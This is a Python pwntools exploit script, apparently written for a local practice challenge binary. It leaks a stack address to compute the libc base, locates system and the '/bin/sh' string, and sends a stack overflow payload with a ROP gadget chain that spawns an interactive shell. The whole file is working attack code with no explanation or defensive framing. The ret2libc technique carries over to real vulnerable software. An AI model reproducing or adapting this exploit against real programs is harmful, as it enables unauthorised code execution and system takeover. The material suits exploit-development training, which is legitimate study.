#!/usr/bin/env python3
from pwn import *

p = process('/challenges/04-system/target', stderr=2)
# p = process(['/challenges/04-system/target'])
e = ELF('/challenges/04-system/target')
# libc = ELF(p.libc.path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print("Libc path: ", libc)

p.readline()
stack_data = p.recv()
print(stack_data)
libc_start_main_ret = int(stack_data.split(b'\n')[5].split(b' ')[1], 16) - 128
print("libc_start_main_ret: ", hex(libc_start_main_ret))

# print(libc.symbols)
libc_start_call_main_offset = 0x29d10
# libc_base = libc_start_main_ret - libc.symbols['__libc_start_call_main']
libc_base = libc_start_main_ret - libc_start_call_main_offset
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

print("libc_base: ", hex(libc_base))
print("system_addr: ", hex(system_addr))
print("bin_sh_addr: ", hex(bin_sh_addr))

bin_sh_str = libc.string(bin_sh_addr - libc_base)
print("Value at '/bin/sh' address:", bin_sh_str)

# bin_sh_str = p.readmem(bin_sh_addr,7)
# print(bin_sh_str)

# pause()
pop_rdi = 0x000000000002a3e5
pop_rax_pop_rdi_call_rax = 0x0000000000125a00


# pop_rdi = e.address + 0x0000000000400733

payload = b'A' * 144
payload += b'B' * 8
payload += p64(pop_rax_pop_rdi_call_rax + libc_base)
# payload+= p64(pop_rdi+libc_base)
payload += p64(system_addr)
payload += p64(bin_sh_addr)

print(payload)
p.send(payload)
# rip_address = p.readmem(0x7fffffffe018,1)
# pause()
# print(rip_address.hex())
p.interactive()